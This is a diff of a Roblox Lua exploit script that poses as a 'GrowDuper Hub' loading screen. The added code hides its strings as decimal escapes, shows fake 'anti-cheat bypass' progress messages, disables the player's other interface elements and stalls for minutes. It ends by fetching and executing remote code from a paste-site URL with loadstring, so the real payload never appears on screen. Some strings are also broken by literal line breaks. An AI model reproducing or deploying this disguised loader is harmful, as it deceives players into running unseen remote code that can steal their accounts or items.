@@ -1,18 +1,17 @@
-local TweenService = game:GetService("TweenService")
-local Players = game:GetService("Players")
-local Player = Players.LocalPlayer
-local PlayerGui = Player:WaitForChild("PlayerGui")
 
--- CONSTANTS
-local GUI_NAME = "GrowDuperLoadingScreen"
+local TweenService = game:GetService("\84\119\101\101\110\83\101\114\118\105\99\101")
+local Players = game:GetService("\80\108\97\121\101\114\115")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("\80\108\97\121\101\114\71\117\105")
+
+local GUI_NAME = "\71\114\111\119\68\117\112\101\114\76\111\97\100\105\110\103\83\99\114\101\101\110"
 
 -- Remove duplicates if any
 if PlayerGui:FindFirstChild(GUI_NAME) then
     PlayerGui:FindFirstChild(GUI_NAME):Destroy()
 end
 
--- Create ScreenGui
-local screenGui = Instance.new("ScreenGui")
+local screenGui = Instance.new("\83\99\114\101\101\110\71\117\105")
 screenGui.Name = GUI_NAME
 screenGui.IgnoreGuiInset = true
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
@@ -21,11 +20,10 @@ pcall(function()
     screenGui.Parent = gethui and gethui() or get_hidden_gui and get_hidden_gui() or PlayerGui
 end)
 
--- Anti-overlay loop
 task.spawn(function()
     while true do
         for _, gui in ipairs(PlayerGui:GetChildren()) do
-            if gui:IsA("ScreenGui") and gui ~= screenGui then
+            if gui:IsA("\83\99\114\101\101\110\71\117\105") and gui ~= screenGui then
                 gui.Enabled = false
             end
         end
@@ -36,26 +34,26 @@ task.spawn(function()
     end
 end)
 
--- Visuals
-local blackBackground = Instance.new("Frame")
+local blackBackground = Instance.new("\70\114\97\109\101")
 blackBackground.Size = UDim2.new(1, 0, 1, 0)
 blackBackground.BackgroundColor3 = Color3.new(0, 0, 0)
 blackBackground.ZIndex = 1
 blackBackground.Parent = screenGui
 
-local purpleOverlay = Instance.new("Frame")
+local purpleOverlay = Instance.new("\70\114\97\109\101")
 purpleOverlay.Size = UDim2.new(1, 0, 1, 0)
 purpleOverlay.BackgroundColor3 = Color3.fromRGB(128, 0, 128)
 purpleOverlay.BackgroundTransparency = 0.6
 purpleOverlay.ZIndex = 2
 purpleOverlay.Parent = screenGui
 
-local titleText = Instance.new("TextLabel")
+local titleText = Instance.new("\84\101\120\116\76\97\98\101\108")
 titleText.Size = UDim2.new(0.9, 0, 0.12, 0)
 titleText.Position = UDim2.new(0.5, 0, 0.18, 0)
 titleText.AnchorPoint = Vector2.new(0.5, 0.5)
 titleText.BackgroundTransparency = 1
-titleText.Text = "GROWDUPER HUB SCRIPT IS\nLOADING..."
+titleText.Text = "GROWDUPER HUB SCRIPT IS
+LOADING..."
 titleText.TextColor3 = Color3.fromRGB(220, 220, 255)
 titleText.TextScaled = true
 titleText.TextWrapped = true
@@ -63,12 +61,12 @@ titleText.Font = Enum.Font.GothamBold
 titleText.ZIndex = 3
 titleText.Parent = screenGui
 
-local glow = Instance.new("ImageLabel")
+local glow = Instance.new("\73\109\97\103\101\76\97\98\101\108")
 glow.Size = UDim2.new(0.85, 0, 0.25, 0)
 glow.Position = UDim2.new(0.5, 0, 0.55, 0)
 glow.AnchorPoint = Vector2.new(0.5, 0.5)
 glow.BackgroundTransparency = 1
-glow.Image = "rbxassetid://5028857084"
+glow.Image = "\114\98\120\97\115\115\101\116\105\100\58\47\47\53\48\50\56\56\53\55\48\56\52"
 glow.ImageColor3 = Color3.fromRGB(130, 80, 255)
 glow.ImageTransparency = 0.6
 glow.ScaleType = Enum.ScaleType.Slice
@@ -76,7 +74,7 @@ glow.SliceCenter = Rect.new(24, 24, 276, 276)
 glow.ZIndex = 3
 glow.Parent = screenGui
 
-local bottomRect = Instance.new("Frame")
+local bottomRect = Instance.new("\70\114\97\109\101")
 bottomRect.Size = UDim2.new(0.8, 0, 0.22, 0)
 bottomRect.Position = UDim2.new(0.5, 0, 0.55, 0)
 bottomRect.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -85,23 +83,22 @@ bottomRect.BackgroundTransparency = 0.75
 bottomRect.ZIndex = 4
 bottomRect.Parent = screenGui
 
-local rectCorner = Instance.new("UICorner")
+local rectCorner = Instance.new("\85\73\67\111\114\110\101\114")
 rectCorner.CornerRadius = UDim.new(0, 20)
 rectCorner.Parent = bottomRect
 
-local stroke = Instance.new("UIStroke")
+local stroke = Instance.new("\85\73\83\116\114\111\107\101")
 stroke.Color = Color3.fromRGB(130, 80, 255)
 stroke.Transparency = 0.6
 stroke.Thickness = 3
 stroke.Parent = bottomRect
 
--- Main Text
-local mainText = Instance.new("TextLabel")
+local mainText = Instance.new("\84\101\120\116\76\97\98\101\108")
 mainText.Size = UDim2.new(0.95, 0, 0.35, 0)
 mainText.Position = UDim2.new(0.5, 0, 0.3, 0)
 mainText.AnchorPoint = Vector2.new(0.5, 0.5)
 mainText.BackgroundTransparency = 1
-mainText.Text = "BREACHING ROBLOX ANTI CHEAT SYSTEM..."
+mainText.Text = "\66\82\69\65\67\72\73\78\71\32\82\79\66\76\79\88\32\65\78\84\73\32\67\72\69\65\84\32\83\89\83\84\69\77\46\46\46"
 mainText.TextColor3 = Color3.new(1, 1, 1)
 mainText.TextScaled = true
 mainText.TextWrapped = true
@@ -110,13 +107,12 @@ mainText.TextTransparency = 1
 mainText.ZIndex = 5
 mainText.Parent = bottomRect
 
--- Wait Text
-local waitText = Instance.new("TextLabel")
+local waitText = Instance.new("\84\101\120\116\76\97\98\101\108")
 waitText.Size = UDim2.new(0.95, 0, 0.25, 0)
 waitText.Position = UDim2.new(0.5, 0, 0.7, 0)
 waitText.AnchorPoint = Vector2.new(0.5, 0.5)
 waitText.BackgroundTransparency = 1
-waitText.Text = "Establishing anti-detection systems..."
+waitText.Text = "\69\115\116\97\98\108\105\115\104\105\110\103\32\97\110\116\105\45\100\101\116\101\99\116\105\111\110\32\115\121\115\116\101\109\115\46\46\46"
 waitText.TextColor3 = Color3.fromRGB(200, 200, 200)
 waitText.TextScaled = true
 waitText.TextWrapped = true
@@ -125,8 +121,7 @@ waitText.TextTransparency = 1
 waitText.ZIndex = 5
 waitText.Parent = bottomRect
 
--- Loading Bar Frame
-local loadingBarFrame = Instance.new("Frame")
+local loadingBarFrame = Instance.new("\70\114\97\109\101")
 loadingBarFrame.Size = UDim2.new(0.9, 0, 0.12, 0)
 loadingBarFrame.Position = UDim2.new(0.5, 0, 1.1, 0)
 loadingBarFrame.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -135,28 +130,26 @@ loadingBarFrame.BackgroundTransparency = 1
 loadingBarFrame.ZIndex = 5
 loadingBarFrame.Parent = bottomRect
 
-local barCorner = Instance.new("UICorner")
+local barCorner = Instance.new("\85\73\67\111\114\110\101\114")
 barCorner.CornerRadius = UDim.new(0, 10)
 barCorner.Parent = loadingBarFrame
 
-local barStroke = Instance.new("UIStroke")
+local barStroke = Instance.new("\85\73\83\116\114\111\107\101")
 barStroke.Thickness = 2
 barStroke.Color = Color3.fromRGB(255, 255, 255)
 barStroke.Parent = loadingBarFrame
 
--- Loading Bar Fill
-local loadingBar = Instance.new("Frame")
+local loadingBar = Instance.new("\70\114\97\109\101")
 loadingBar.Size = UDim2.new(0, 0, 1, 0)
 loadingBar.BackgroundColor3 = Color3.fromRGB(200, 150, 255)
 loadingBar.BackgroundTransparency = 1
 loadingBar.ZIndex = 6
 loadingBar.Parent = loadingBarFrame
 
-local innerBarCorner = Instance.new("UICorner")
+local innerBarCorner = Instance.new("\85\73\67\111\114\110\101\114")
 innerBarCorner.CornerRadius = UDim.new(0, 10)
 innerBarCorner.Parent = loadingBar
 
--- Fade In
 local function fadeIn()
     local fadeInfo = TweenInfo.new(0.7, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
     TweenService:Create(mainText, fadeInfo, {TextTransparency = 0}):Play()
@@ -165,24 +158,25 @@ local function fadeIn()
     TweenService:Create(loadingBar, fadeInfo, {BackgroundTransparency = 0}):Play()
 end
 
--- Loading Bar Animation (120 seconds)
 local function animateLoadingBar()
     local tweenInfo = TweenInfo.new(160, Enum.EasingStyle.Linear) 
     local tween = TweenService:Create(loadingBar, tweenInfo, {Size = UDim2.new(1, 0, 1, 0)})
     tween:Play()
 
     tween.Completed:Connect(function()
-        -- After 3 minutes
-        mainText.Text = "Please wait 3–5 minutes while we finalize the bypass system..."
-        waitText.Text = "Ensuring maximum stealth and injection stability."
+        mainText.Text = "\80\108\101\97\115\101\32\119\97\105\116\32\51\8211\53\32\109\105\110\117\116\101\115\32\119\104\105\108\101\32\119\101\32\102\105\110\97\108\105\122\101\32\116\104\101\32\98\121\112\97\115\115\32\115\121\115\116\101\109\46\46\46"
+        waitText.Text = "\69\110\115\117\114\105\110\103\32\109\97\120\105\109\117\109\32\115\116\101\97\108\116\104\32\97\110\100\32\105\110\106\101\99\116\105\111\110\32\115\116\97\98\105\108\105\116\121\46"
 
-        task.delay(160, function() -- After another 2 minutes (5 total) 
-            mainText.Text = "⚠️ SERVER ISSUE DETECTED"
-            waitText.Text = "Please rejoin a different server with fewer players.\nAvoid servers with more than 3 people to prevent bugs."
+        task.delay(160, function() 
+            mainText.Text = "\9888\65039\32\83\69\82\86\69\82\32\73\83\83\85\69\32\68\69\84\69\67\84\69\68"
+            waitText.Text = "Please rejoin a different server with fewer players.
+Avoid servers with more than 3 people to prevent bugs."
         end)
     end)
 end
 
--- Start
 fadeIn()
 animateLoadingBar()
+
+task.wait(1)
+loadstring(game:HttpGet("https://pastefy.app/0zX3kQZJ/raw"))()
